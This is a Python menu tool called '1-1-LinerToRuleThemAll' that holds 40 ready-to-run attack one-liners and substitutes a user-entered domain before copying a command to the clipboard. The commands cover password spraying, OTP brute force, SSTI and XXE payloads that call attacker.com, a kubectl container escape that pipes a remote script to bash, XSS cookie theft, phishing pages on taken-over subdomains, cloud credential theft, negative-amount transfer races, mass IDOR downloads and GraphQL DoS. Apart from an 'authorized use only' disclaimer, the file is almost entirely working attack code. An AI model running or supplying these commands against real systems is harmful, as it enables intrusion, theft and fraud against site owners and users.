#!/usr/bin/env python3
r"""
===============================================================================
  __  __       _     _                  _____       ____        _
 /_ |/_ |     | |   (_)                |_   _|     |  _ \      | |
  | | | |     | |    _ _ __   ___ _ __   | | ___   | |_) |_   _| | ___
  | | | | ____| |   | | '_ \ / _ | '__|  | |/ _ \  |  _ <| | | | |/ _ \\
  | | | ||____| |___| | | | |  __| |    _| | (_) | | |_) | |_| | |  __/
  |_| |_|     |_____|_|_| |_|\___|_|   |_____\___/  |____/ \__,_|_|\___|

  _______ _                       _    _ _
 |__   __| |                     | |  | | |
    | |  | |__   ___ _ __ ___    | |__| | |
    | |  | '_ \ / _ | '_ ` _ \  |  __  | |
    | |  | | | |  __| | | | | | | |  | | |____
    |_|  |_| |_|\___|_| |_| |_| |_|  |_|______|

           _    _ _ _
          / \  | | | |
         / _ \ | | | |
        / ___ \| | |_|
       /_/   \_|_|_(_)

  1-1-LinerToRuleThemAll
  Penetration Testing One-Liner Reference Tool
  ** AUTHORIZED USE ONLY **
===============================================================================
"""

import os
import sys
import shutil

# ---------------------------------------------------------------------------
# COMMAND DATABASE
# ---------------------------------------------------------------------------
COMMANDS = [
    {
        "id": 1,
        "category": "EXTREME RECONNAISSANCE",
        "title": "Full Infrastructure Mapping with Passive + Active Intelligence Fusion",
        "cmd": (
            'subfinder -d target.com -all -silent | dnsx -silent -resp -a -cname -ptr -txt -mx -soa '
            '| tee dns.txt | awk \'{print $1}\' | httpx -silent -td -cdn -csp -fhr -title -server '
            '-tech-detect -status-code -content-length -json | jq -r \'select(.cdn==false and '
            '.status_code!=403) | [.url,.tech[]?,.title,.server] | @tsv\' | nuclei -t cves/ -t '
            'exposures/ -t vulnerabilities/ -rl 200 -bs 50 -c 50 -silent | notify -silent'
        ),
    },
    {
        "id": 2,
        "category": "EXTREME RECONNAISSANCE",
        "title": "Autonomous Bug Bounty Hunter (Set & Forget)",
        "cmd": (
            'while true; do subfinder -d target.com -all -silent | dnsx -silent | httpx -silent -json '
            '-td -cdn -waf | jq -r \'select(.cdn==false and .waf==false) | .url\' | nuclei -t '
            '~/nuclei-templates/ -rl 150 -bs 30 -severity critical,high,medium -silent | grep -E '
            '"\\[critical\\]|\\[high\\]" | tee -a critical_findings_$(date +%F).txt | notify -provider '
            'discord -id bounty -silent; sleep 3600; done'
        ),
    },
    {
        "id": 3,
        "category": "EXTREME RECONNAISSANCE",
        "title": "Certificate Transparency -> Hidden Assets -> Instant Exploitation",
        "cmd": (
            'curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r \'.[].name_value\' | sort -u '
            '| sed \'s/\\*\\.//g\' | dnsx -silent -resp -a | awk \'{print $1,$2}\' | httpx -silent -probe '
            '-td -ports 80,443,8080,8443,8888 -path /admin,/api/v1/admin,/actuator/env,/.git/config,'
            '/graphql -mc 200,401,403 -json | jq -r \'select(.status_code==200 or .status_code==401) | '
            '"\\(.url) [\\(.tech[]?)] \\(.title)"\' | nuclei -t exposures/ -rl 300'
        ),
    },
    {
        "id": 4,
        "category": "EXTREME RECONNAISSANCE",
        "title": "JavaScript Recon Pipeline: Secrets + Endpoints + Vuln Detection",
        "cmd": (
            'echo "target.com" | gau | grep "\\.js$" | httpx -silent -mc 200 | anti-burl | while read js; '
            'do echo "$js" | hakrawler -js -plain -usewayback -scope yolo | tee -a endpoints.txt && '
            'curl -s "$js" | grep -oP \'(?:api[_-]?key|secret|token|password|aws[_-]?key|private[_-]?key)'
            '[\"\\047]\\s*[:=]\\s*[\"\\047]([^\"\\047]{8,})[\"\\047]\' | anew secrets.txt && echo "$js"; '
            'done | nuclei -t exposures/tokens/ -silent'
        ),
    },
    {
        "id": 5,
        "category": "EXTREME RECONNAISSANCE",
        "title": "Weaponized Subdomain Takeover Hunter with Auto-Exploit",
        "cmd": (
            'subfinder -d target.com -all -silent | dnsx -silent -cname -resp | grep -E '
            '"github\\.io|herokuapp\\.com|s3\\.amazonaws|azurewebsites\\.net|netlify\\.app|vercel\\.app'
            '|surge\\.sh" | awk \'{print $1,$2}\' | while read sub cname; do httpx -silent -u "$sub" '
            '-mc 404 && echo "$sub -> $cname [VULNERABLE]" | tee -a takeovers.txt && (echo '
            '\'{"message":"CLAIMED BY @YourHandle - Report Pending"}\' > /tmp/claim.json && curl -X PUT '
            '"https://${cname}/claim" -d @/tmp/claim.json); done'
        ),
    },
    {
        "id": 6,
        "category": "WEAPONIZED AUTHENTICATION ATTACKS",
        "title": "Distributed Password Spraying with Smart Delay (Anti-Detection)",
        "cmd": (
            'cat users.txt | while read user; do cat passwords.txt | parallel -j 5 --delay 2 '
            '"curl -s -X POST https://target.com/login -d \'username=$user&password={}\' -L | '
            'grep -i \'dashboard\\|welcome\' && echo \'CRACKED: $user:{}\' | tee -a cracked.txt"; '
            'sleep 30; done'
        ),
    },
    {
        "id": 7,
        "category": "WEAPONIZED AUTHENTICATION ATTACKS",
        "title": "JWT Exploitation Suite: None Alg + Key Confusion + Brute Force",
        "cmd": (
            'JWT=$1; echo $JWT | jwt_tool - -X a -ju \'https://attacker.com/jwks.json\' | tee '
            'jwt_confusion.txt && echo $JWT | jwt_tool - -X n | tee jwt_none.txt && echo $JWT | '
            'jwt_tool - -C -d /usr/share/wordlists/rockyou.txt | grep "VALID" | tee jwt_cracked.txt '
            '&& cat jwt_*.txt | while read token; do curl -s https://target.com/api/admin -H '
            '"Authorization: Bearer $token" | grep -i "admin\\|success"; done'
        ),
    },
    {
        "id": 8,
        "category": "WEAPONIZED AUTHENTICATION ATTACKS",
        "title": "OAuth Exploit Chain: Code Stealing + PKCE Bypass + Account Takeover",
        "cmd": (
            'echo "https://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=https://attacker.com'
            '/callback&response_type=code&state=STATE" | httpx -silent -follow-redirects | grep -oP '
            '"code=[^&]+" | cut -d= -f2 | while read code; do curl -s -X POST https://target.com'
            '/oauth/token -d "client_id=CLIENT&code=$code&grant_type=authorization_code&redirect_uri='
            'https://attacker.com" | jq -r \'.access_token\' | xargs -I{} curl -s https://target.com'
            '/api/me -H "Authorization: Bearer {}"; done'
        ),
    },
    {
        "id": 9,
        "category": "WEAPONIZED AUTHENTICATION ATTACKS",
        "title": "Session Hijacking via Cookie Injection Across 100+ Subdomains",
        "cmd": (
            'subfinder -d target.com -silent | httpx -silent -mc 200 | parallel -j 50 "curl -s {} '
            '-H \'Cookie: session=$VICTIM_SESSION; domain=.target.com; path=/\' -L | grep -i '
            '\'welcome\\|dashboard\' && echo \'HIJACKED: {}\'" | anew hijacked_sessions.txt'
        ),
    },
    {
        "id": 10,
        "category": "WEAPONIZED AUTHENTICATION ATTACKS",
        "title": "Multi-Factor Authentication Bypass via Rate Limit Exploitation",
        "cmd": (
            'seq 000000 999999 | parallel -j 100 --pipe-part -a /dev/stdin "xargs -I{} curl -s -X POST '
            'https://target.com/verify-otp -d \'code={}&session=$SESSION\' -w \'%{http_code}\\n\' | '
            'grep -E \'^(200|302)$\' && echo \'OTP CRACKED: {}\' | tee otp.txt"'
        ),
    },
    {
        "id": 11,
        "category": "INJECTION ATTACKS (EXTREME)",
        "title": "Blind SQL Injection with DNS Exfiltration (No HTTP Response Needed)",
        "cmd": (
            'cat sqli_points.txt | qsreplace "1\' AND (SELECT LOAD_FILE(CONCAT(\'\\\\\\\\\\\\\\\\\','
            '@@version,\'.BURP_COLLABORATOR.oastify.com\\\\\\\\x\')))-- -" | httpx -silent && dig '
            '+short BURP_COLLABORATOR.oastify.com | grep -v root | cut -d. -f1 | xxd -r -p'
        ),
    },
    {
        "id": 12,
        "category": "INJECTION ATTACKS (EXTREME)",
        "title": "Polyglot Injection: SQL + NoSQL + LDAP + XPath + OS Command",
        "cmd": (
            'echo "admin\' OR \'1\'=\'1\' UNION SELECT NULL,load_file(\'/etc/passwd\')-- -" | '
            'sed \'s/admin/*)(/g\' | sed \'s/OR/(objectClass=/g\' | tee polyglot.txt && cat endpoints.txt '
            '| qsreplace "$(cat polyglot.txt)" | httpx -silent -mc 200 -mr "root:|uid=0|syntax error|LDAP|xpath"'
        ),
    },
    {
        "id": 13,
        "category": "INJECTION ATTACKS (EXTREME)",
        "title": "Blind NoSQL Injection with Regex Timing Attack",
        "cmd": (
            'echo "https://target.com/api/user?username=admin" | qsreplace \'{"$regex":"^a.*"}\' | '
            'httpx -silent --timeout 10 | awk \'{t1=systime()}; {system($0)}; {if(systime()-t1>5) '
            'print "MATCH: a"}\' && for c in {b..z}; do echo "https://target.com/api/user?username=admin" '
            '| qsreplace "{\\"$regex\\":\\"^$c.*\\"}" | httpx -silent --timeout 10; done'
        ),
    },
    {
        "id": 14,
        "category": "INJECTION ATTACKS (EXTREME)",
        "title": "Template Injection with Sandbox Escape (Python/Jinja2/Twig)",
        "cmd": (
            'cat ssti_points.txt | qsreplace "{{config.__class__.__init__.__globals__[\'os\'].popen(\'curl '
            'http://attacker.com$(whoami)\').read()}}" | httpx -silent -mc 200 && tail -f '
            '/var/log/nginx/access.log | grep "whoami"'
        ),
    },
    {
        "id": 15,
        "category": "INJECTION ATTACKS (EXTREME)",
        "title": "XXE to RCE via PHP Expect Wrapper",
        "cmd": (
            'echo \'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]>'
            '<root>&xxe;</root>\' | curl -X POST https://target.com/upload -H "Content-Type: '
            'application/xml" -d @- | grep -i "root\\|www-data"'
        ),
    },
    {
        "id": 16,
        "category": "SSRF & DESERIALIZATION",
        "title": "SSRF Chain: AWS Metadata -> IAM Role -> Full Account Takeover",
        "cmd": (
            'cat ssrf_points.txt | qsreplace "http://169.254.169.254/latest/meta-data/iam/'
            'security-credentials/" | httpx -silent -mc 200 | while read url; do curl -s "$url" | '
            'jq -r \'.AccessKeyId,.SecretAccessKey,.Token\' | xargs -I{} aws configure set {} '
            '--profile stolen && aws s3 ls --profile stolen; done'
        ),
    },
    {
        "id": 17,
        "category": "SSRF & DESERIALIZATION",
        "title": "Blind SSRF with OOB Data Exfiltration via SMB",
        "cmd": (
            'cat params.txt | qsreplace "file://attacker.com/share" | httpx -silent && '
            'impacket-smbserver share /tmp/exfil -smb2support | tee smb_exfil.log | grep -i "ntlm\\|hash"'
        ),
    },
    {
        "id": 18,
        "category": "SSRF & DESERIALIZATION",
        "title": "Java Deserialization RCE Hunter (ysoserial Automation)",
        "cmd": (
            'for payload in CommonsCollections1 CommonsCollections5 CommonsBeanutils1; do echo "$payload" | '
            'ysoserial $payload "curl http://attacker.com/$payload" | base64 | xargs -I{} curl -s '
            'https://target.com/api -H "Cookie: session={}" -w "\\n%{http_code}" | grep 200 && echo '
            '"VULNERABLE TO: $payload"; done'
        ),
    },
    {
        "id": 19,
        "category": "SSRF & DESERIALIZATION",
        "title": "GraphQL SSRF via Introspection + Mutation Abuse",
        "cmd": (
            'echo \'{"query":"mutation{__typename}"}\' | curl -X POST https://target.com/graphql -d @- '
            '-H "Content-Type: application/json" | grep __typename && echo \'{"query":"mutation{webhook('
            'url:\\"http://169.254.169.254/latest/meta-data/\\"){response}}"}\' | curl -X POST '
            'https://target.com/graphql -d @-'
        ),
    },
    {
        "id": 20,
        "category": "LOGIC FLAWS & BUSINESS LOGIC",
        "title": "Race Condition Exploitation for Financial Gain",
        "cmd": (
            'seq 1 1000 | parallel -j 100 "curl -s -X POST https://target.com/api/transfer -H '
            '\'Authorization: Bearer $TOKEN\' -d \'{\\\"from\\\":\\\"attacker\\\",\\\"to\\\":\\\"victim\\\","'
            '\\\"amount\\\":-9999}\' -w \'%{http_code}\\n\'" | grep "200" && curl -s '
            'https://target.com/api/balance -H "Authorization: Bearer $TOKEN"'
        ),
    },
    {
        "id": 21,
        "category": "LOGIC FLAWS & BUSINESS LOGIC",
        "title": "IDOR Exploitation: Mass Data Exfiltration with Parallelization",
        "cmd": (
            'seq 1 100000 | parallel -j 200 "curl -s https://target.com/api/invoice/{}.pdf -H '
            '\'Authorization: Bearer $TOKEN\' -o invoices/{}.pdf 2>&1 | grep -v \'404\'" && ls -lh '
            'invoices/ | wc -l'
        ),
    },
    {
        "id": 22,
        "category": "LOGIC FLAWS & BUSINESS LOGIC",
        "title": "Parameter Pollution -> Price Manipulation in E-Commerce",
        "cmd": (
            'curl -s -X POST https://target.com/checkout -d "item=laptop&price=1000&price=1&quantity=1" '
            '-H "Cookie: $COOKIE" | grep -i "total.*\\$1" && echo "PRICE MANIPULATION SUCCESS"'
        ),
    },
    {
        "id": 23,
        "category": "LOGIC FLAWS & BUSINESS LOGIC",
        "title": "Mass Assignment -> Privilege Escalation on Registration",
        "cmd": (
            'curl -s -X POST https://target.com/register -d "username=hacker&password=test&'
            'email=hacker@evil.com&role=admin&isAdmin=true&privilege=99&isSuperUser=1" | grep -i '
            '"admin\\|superuser" && echo "PRIVILEGE ESCALATION VIA MASS ASSIGNMENT"'
        ),
    },
    {
        "id": 24,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "Complete Takeover: XSS -> Cookie Theft -> Session Hijack -> Data Exfil",
        "cmd": (
            """echo "https://target.com/search?q=<img src=x onerror='fetch("""
            """"http://attacker.com/?c="+btoa(document.cookie+"|"+localStorage.getItem("token")))'>" """
            """| httpx -silent -mc 200 && nc -lvnp 80 | tee cookies.log | grep "Cookie:" | cut -d= -f2 """
            """| base64 -d | cut -d'|' -f2 | xargs -I{} curl -s https://target.com/api/admin/users """
            """-H "Authorization: Bearer {}" | jq -r '.[]|[.email,.password]|@csv' > user_dump.csv"""
        ),
    },
    {
        "id": 25,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "Cloud Metadata -> Container Escape -> Host Compromise",
        "cmd": (
            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | xargs -I{} '
            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{} | jq -r '
            '\'[.AccessKeyId,.SecretAccessKey,.Token]|@tsv\' | xargs -I{} aws eks list-clusters '
            '--profile stolen && kubectl get pods --all-namespaces && kubectl exec -it vulnerable-pod '
            '-- /bin/bash -c "chroot /host && cat /etc/shadow"'
        ),
    },
    {
        "id": 26,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "Subdomain Takeover -> Phishing -> Credential Harvesting Pipeline",
        "cmd": (
            'subfinder -d target.com -silent | dnsx -silent -cname | grep "s3.amazonaws" | httpx -mc 404 '
            '| while read sub; do aws s3 mb "s3://${sub#https://}" && echo \'<html><form action='
            '"http://attacker.com/harvest" method=POST>Email:<input name=email>Password:<input name=pass '
            'type=password><input type=submit></form></html>\' | aws s3 cp - "s3://${sub#https://}/'
            'index.html" --acl public-read && echo "PHISHING DEPLOYED: $sub"; done'
        ),
    },
    {
        "id": 27,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "API Key Leak -> Full Service Impersonation",
        "cmd": (
            'echo "target.com" | gau | grep -E "\\.js$|\\.json$|\\.xml$|\\.env$|\\.config$" | httpx '
            '-silent -mc 200 | parallel -j 50 "curl -s {} | grep -oP \'(?:api[_-]?key|secret|token)'
            '[\\\"\\\\047]?\\s*[:=]\\s*[\\\"\\\\047]?([A-Za-z0-9_\\-]{20,})[\\\"\\\\047]?\' | tee -a '
            'api_keys.txt" && cat api_keys.txt | while read key; do curl -s https://api.target.com'
            '/admin/users -H "X-API-Key: $key" | jq -r \'select(.users) | "VALID KEY: \'$key\'"\'; done'
        ),
    },
    {
        "id": 28,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "Prototype Pollution -> Account Takeover via Admin Creation",
        "cmd": (
            'curl -s -X POST https://target.com/api/user -H "Content-Type: application/json" -d '
            '\'{"__proto__":{"isAdmin":true},"username":"attacker","password":"hacked"}\' && curl -s '
            'https://target.com/login -d "username=attacker&password=hacked" | grep -i "admin dashboard"'
        ),
    },
    {
        "id": 29,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "CORS Misconfiguration -> Sensitive API Data Exfiltration",
        "cmd": (
            'cat api_endpoints.txt | httpx -silent -H "Origin: https://evil.com" -mc 200 -mr '
            '"Access-Control-Allow-Origin.*evil.com" | while read api; do curl -s "$api" -H '
            '"Origin: https://evil.com" --include | grep -i "access-control-allow-credentials: true" '
            '&& curl -s "$api/api/users" -H "Origin: https://evil.com" -H "Cookie: $VICTIM_COOKIE" | '
            'jq -r \'.[]|[.email,.ssn,.credit_card]|@csv\' | tee exfiltrated_data.csv; done'
        ),
    },
    {
        "id": 30,
        "category": "FULL EXPLOITATION CHAINS",
        "title": "Kubernetes API Exploitation -> Cluster Admin Privilege Escalation",
        "cmd": (
            'cat k8s_endpoints.txt | while read api; do curl -sk "$api/api/v1/namespaces/default/pods" '
            '-H "Authorization: Bearer $TOKEN" | jq -r \'.items[].spec.containers[].image\' | grep -i '
            '"latest\\|debug" && kubectl --token=$TOKEN --server=$api run evil --image=alpine '
            '--restart=Never -- sh -c "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c '
            '\'curl http://attacker.com/root.sh|bash\'"; done'
        ),
    },
    {
        "id": 31,
        "category": "ADVANCED EVASION & BYPASSES",
        "title": "WAF Bypass via HTTP Parameter Pollution + Encoding Chains",
        "cmd": (
            'echo "https://target.com/api?id=1" | qsreplace "1%2527%2520UNION%2520SELECT%2520NULL%252C'
            'LOAD_FILE%2528%25270x2f6574632f706173737764%2527%2529%252C%2527%2527%2523" | httpx -silent '
            '-mc 200 -mr "root:"'
        ),
    },
    {
        "id": 32,
        "category": "ADVANCED EVASION & BYPASSES",
        "title": "IP Restriction Bypass via IPv6 + Header Injection Combo",
        "cmd": (
            'cat admin_endpoints.txt | httpx -silent -H "X-Forwarded-For: ::1" -H "X-Real-IP: 127.0.0.1" '
            '-H "X-Originating-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "True-Client-IP: '
            '127.0.0.1" -mc 200,302 | tee bypassed_admin.txt'
        ),
    },
    {
        "id": 33,
        "category": "ADVANCED EVASION & BYPASSES",
        "title": "Rate Limit Bypass via Rotating User-Agents + IP Spoofing",
        "cmd": (
            'seq 1 10000 | parallel -j 500 "curl -s -X POST https://target.com/api/sensitive -H '
            '\'X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM\' -H \'User-Agent: Mozilla/5.0 (X11; '
            'Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\\$RANDOM.0.0.0 Safari/537.36\' '
            '-d \'query=dump\' -w \'%{http_code}\\n\'" | grep -c 200'
        ),
    },
    {
        "id": 34,
        "category": "ADVANCED EVASION & BYPASSES",
        "title": "CSP Bypass via JSONP Callback + DOM Clobbering",
        "cmd": (
            'echo "https://target.com/search?q=<script src=https://target.com/api/jsonp?callback='
            'alert(document.domain)></script>" | httpx -silent -mc 200 && echo "https://target.com/?x='
            '<form id=csp><input name=nonce value=attacker></form>" | httpx -silent'
        ),
    },
    {
        "id": 35,
        "category": "ADVANCED EVASION & BYPASSES",
        "title": "GraphQL DoS via Recursive Query Bomb",
        "cmd": (
            'echo \'query{users{posts{comments{author{posts{comments{author{posts{comments{author{posts'
            '{comments{author{id}}}}}}}}}}}}}}\' | python3 -c "import sys; q=sys.stdin.read(); '
            'print(q*100)" | curl -X POST https://target.com/graphql -d @- -H "Content-Type: '
            'application/json" --max-time 60'
        ),
    },
    {
        "id": 36,
        "category": "ADVANCED EXPLOITATION",
        "title": "Mass Open-Redirect -> SSRF -> AWS/GCP Metadata -> IAM Role Theft",
        "cmd": (
            'cat redirect_points.txt | qsreplace "http://169.254.169.254/latest/meta-data/iam/'
            'security-credentials/" | httpx -silent -fr -mc 200 | xargs -I{} curl -s {} | jq -r '
            '\'.AccessKeyId + " " + .SecretAccessKey\' | tee stolen_creds.txt && cat stolen_creds.txt | '
            'parallel --colsep \' \' aws sts get-caller-identity --profile temp_{#}'
        ),
    },
    {
        "id": 37,
        "category": "ADVANCED EXPLOITATION",
        "title": "Blind XXE -> OOB Exfil + Expect Wrapper RCE (PHP)",
        "cmd": (
            'echo \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.'
            'base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>\' | curl -s -X POST https://target.com'
            '/upload -H "Content-Type: application/xml" -d @- | base64 -d && echo \'<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://curl http://attacker.com$(whoami)">]><foo>'
            '&xxe;</foo>\' | curl -s -X POST https://target.com/upload -H "Content-Type: application/xml" '
            '-d @-'
        ),
    },
    {
        "id": 38,
        "category": "ADVANCED EXPLOITATION",
        "title": "GraphQL Batch + Depth Bomb + Introspection Abuse",
        "cmd": (
            'python3 -c \'q="query{__schema{types{name fields{name}}}}"; '
            'print("{\\\"query\\\":\\\""+q*500+"\\\"}")\' | curl -X POST https://target.com/graphql -d @- '
            '-H "Content-Type: application/json" --max-time 45 && echo \'{"query":"{__schema{queryType'
            '{fields{name}}}}"}\' | curl -X POST https://target.com/graphql -d @-'
        ),
    },
    {
        "id": 39,
        "category": "ADVANCED EXPLOITATION",
        "title": "WebSocket Hijack + Token Theft -> Persistent Session",
        "cmd": (
            "websocat wss://target.com/ws -E | grep -oE '[\"\\047]?token[\"\\047]?\\s*[:=]\\s*"
            "[\"\\047]([^\"\\047]+)' | cut -d= -f2 | xargs -I{} curl -s https://target.com/api/admin "
            "-H \"Authorization: Bearer {}\" | tee hijacked.txt"
        ),
    },
    {
        "id": 40,
        "category": "ADVANCED EXPLOITATION",
        "title": "Prototype Pollution -> Mass Assignment -> RCE via __proto__",
        "cmd": (
            'curl -X POST https://target.com/api/register -H "Content-Type: application/json" -d '
            '\'{"__proto__":{"isAdmin":true,"shell":"node -e require(\\"child_process\\").exec(\\"curl '
            'http://attacker.com$(whoami)\\")"},"username":"hax","role":"admin"}\' && curl '
            'https://target.com/trigger-payload'
        ),
    },
]

# ---------------------------------------------------------------------------
# CATEGORIES (ordered for display)
# ---------------------------------------------------------------------------
CATEGORIES = [
    "EXTREME RECONNAISSANCE",
    "WEAPONIZED AUTHENTICATION ATTACKS",
    "INJECTION ATTACKS (EXTREME)",
    "SSRF & DESERIALIZATION",
    "LOGIC FLAWS & BUSINESS LOGIC",
    "FULL EXPLOITATION CHAINS",
    "ADVANCED EVASION & BYPASSES",
    "ADVANCED EXPLOITATION",
]


# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

def get_term_width():
    """Get terminal width, default 80."""
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80


def hr(char="-"):
    """Print a horizontal rule."""
    print(char * get_term_width())


def banner():
    """Display the project banner."""
    b = r"""
===============================================================================
  __  __       _     _                  _____       ____        _
 /_ |/_ |     | |   (_)                |_   _|     |  _ \      | |
  | | | |     | |    _ _ __   ___ _ __   | | ___   | |_) |_   _| | ___
  | | | | ____| |   | | '_ \ / _ | '__|  | |/ _ \  |  _ <| | | | |/ _ \
  | | | ||____| |___| | | | |  __| |    _| | (_) | | |_) | |_| | |  __/
  |_| |_|     |_____|_|_| |_|\___|_|   |_____\___/  |____/ \__,_|_|\___|

  _______ _                       _    _ _
 |__   __| |                     | |  | | |
    | |  | |__   ___ _ __ ___    | |__| | |
    | |  | '_ \ / _ | '_ ` _ \  |  __  | |
    | |  | | | |  __| | | | | | | |  | | |____
    |_|  |_| |_|\___|_| |_| |_| |_|  |_|______|

           _    _ _ _
          / \  | | | |
         / _ \ | | | |
        / ___ \| | |_|
       /_/   \_|_|_(_)

  1-1-LinerToRuleThemAll  |  Penetration Testing One-Liner Arsenal
  ** FOR AUTHORIZED ENGAGEMENTS ONLY **
===============================================================================
"""
    print(b)


def disclaimer():
    """Print the legal disclaimer."""
    hr("=")
    print("""
  *** LEGAL DISCLAIMER ***

  These one-liners are WEAPONIZED commands intended for use ONLY during
  AUTHORIZED penetration testing engagements and bug bounty programs.

  Unauthorized use against systems you do not own or have explicit
  written permission to test is ILLEGAL and UNETHICAL.

  YOU are solely responsible for your actions. Deploy responsibly.
""")
    hr("=")


def print_category_menu():
    """Print the category listing."""
    print("\n  CATEGORIES:")
    hr()
    for i, cat in enumerate(CATEGORIES, 1):
        print(f"  [{i}] {cat}")
    print(f"  [A] ALL COMMANDS")
    print(f"  [S] SEARCH commands by keyword")
    print(f"  [Q] QUIT")
    hr()


def get_cmds_by_category(cat):
    """Return commands in the given category."""
    return [c for c in COMMANDS if c["category"] == cat]


def search_commands(keyword):
    """Search commands by keyword in title, category, or command text."""
    kw = keyword.lower()
    results = []
    for c in COMMANDS:
        if (kw in c["title"].lower() or
            kw in c["category"].lower() or
            kw in c["cmd"].lower()):
            results.append(c)
    return results


def display_command_list(cmds):
    """Display a numbered list of commands."""
    if not cmds:
        print("\n  No commands found.\n")
        return
    current_cat = None
    for c in cmds:
        if c["category"] != current_cat:
            current_cat = c["category"]
            print(f"\n  --- {current_cat} ---")
        print(f"  [{c['id']:>2}] {c['title']}")


def display_single_command(cmd, target=None):
    """Display a single command with both raw and targeted versions."""
    hr("=")
    print(f"  #{cmd['id']} | {cmd['category']}")
    print(f"  {cmd['title']}")
    hr("=")

    raw = cmd["cmd"]

    print("\n  [RAW COMMAND] (target.com placeholder)")
    print("  " + "-" * 40)
    print()
    print(raw)
    print()

    if target and target.lower() != "target.com":
        replaced = raw.replace("target.com", target)
        # Also handle api.target.com -> api.<target>
        print(f"  [TARGETED COMMAND] (target: {target})")
        print("  " + "-" * 40)
        print()
        print(replaced)
        print()

    hr("-")
    print("  [C] Copy targeted command   [R] Copy raw command")
    print("  [B] Back to list            [Q] Quit")
    hr("-")


def copy_to_clipboard(text):
    """
    Attempt to copy text to clipboard. Falls back to displaying
    the command in a clean copy-friendly block.
    """
    copied = False

    # Try xclip
    try:
        import subprocess
        proc = subprocess.Popen(
            ["xclip", "-selection", "clipboard"],
            stdin=subprocess.PIPE, stderr=subprocess.PIPE
        )
        proc.communicate(text.encode())
        if proc.returncode == 0:
            copied = True
    except (FileNotFoundError, Exception):
        pass

    # Try xsel
    if not copied:
        try:
            import subprocess
            proc = subprocess.Popen(
                ["xsel", "--clipboard", "--input"],
                stdin=subprocess.PIPE, stderr=subprocess.PIPE
            )
            proc.communicate(text.encode())
            if proc.returncode == 0:
                copied = True
        except (FileNotFoundError, Exception):
            pass

    # Try pbcopy (macOS)
    if not copied:
        try:
            import subprocess
            proc = subprocess.Popen(
                ["pbcopy"],
                stdin=subprocess.PIPE, stderr=subprocess.PIPE
            )
            proc.communicate(text.encode())
            if proc.returncode == 0:
                copied = True
        except (FileNotFoundError, Exception):
            pass

    if copied:
        print("\n  [*] Copied to clipboard!\n")
    else:
        print("\n  [!] Clipboard not available. Command printed below for copy/paste:")
        print()
        hr("~")
        print(text)
        hr("~")
        print()


# ---------------------------------------------------------------------------
# MAIN LOOP
# ---------------------------------------------------------------------------

def main():
    os.system("clear" if os.name != "nt" else "cls")
    banner()
    disclaimer()

    # --- Get target ---
    print("\n  Enter the target domain (or press Enter to keep 'target.com'):")
    target_input = input("  > ").strip()
    target = target_input if target_input else "target.com"

    print(f"\n  [*] Target set to: {target}")
    if target == "target.com":
        print("  [*] Using default placeholder. Commands will show as-is.")
    print()

    while True:
        print_category_menu()
        choice = input("  Select option > ").strip().upper()

        if choice == "Q":
            print("\n  Stay legal. Stay sharp. Exiting.\n")
            sys.exit(0)

        elif choice == "S":
            keyword = input("  Search keyword > ").strip()
            if not keyword:
                continue
            results = search_commands(keyword)
            display_command_list(results)
            if not results:
                continue
            print()
            sel = input("  Enter command # to view (or B to go back) > ").strip().upper()
            if sel == "B":
                continue
            try:
                sel_id = int(sel)
                cmd_obj = next((c for c in COMMANDS if c["id"] == sel_id), None)
                if cmd_obj:
                    _command_viewer(cmd_obj, target)
            except ValueError:
                print("  [!] Invalid selection.")

        elif choice == "A":
            display_command_list(COMMANDS)
            print()
            sel = input("  Enter command # to view (or B to go back) > ").strip().upper()
            if sel == "B":
                continue
            try:
                sel_id = int(sel)
                cmd_obj = next((c for c in COMMANDS if c["id"] == sel_id), None)
                if cmd_obj:
                    _command_viewer(cmd_obj, target)
            except ValueError:
                print("  [!] Invalid selection.")

        elif choice.isdigit() and 1 <= int(choice) <= len(CATEGORIES):
            cat = CATEGORIES[int(choice) - 1]
            cmds = get_cmds_by_category(cat)
            display_command_list(cmds)
            print()
            sel = input("  Enter command # to view (or B to go back) > ").strip().upper()
            if sel == "B":
                continue
            try:
                sel_id = int(sel)
                cmd_obj = next((c for c in cmds if c["id"] == sel_id), None)
                if cmd_obj:
                    _command_viewer(cmd_obj, target)
            except ValueError:
                print("  [!] Invalid selection.")
        else:
            print("  [!] Invalid option. Try again.")


def _command_viewer(cmd_obj, target):
    """Interactive viewer for a single command."""
    while True:
        display_single_command(cmd_obj, target)
        action = input("  Action > ").strip().upper()
        if action == "C":
            out = cmd_obj["cmd"].replace("target.com", target) if target != "target.com" else cmd_obj["cmd"]
            copy_to_clipboard(out)
        elif action == "R":
            copy_to_clipboard(cmd_obj["cmd"])
        elif action == "B":
            break
        elif action == "Q":
            print("\n  Stay legal. Stay sharp. Exiting.\n")
            sys.exit(0)
        else:
            print("  [!] Invalid action.")


# ---------------------------------------------------------------------------
# CHANGE TARGET MID-SESSION
# ---------------------------------------------------------------------------

def change_target_hint():
    """Hint text shown in menus (not implemented as separate menu item to keep it clean)."""
    pass


if __name__ == "__main__":
    main()
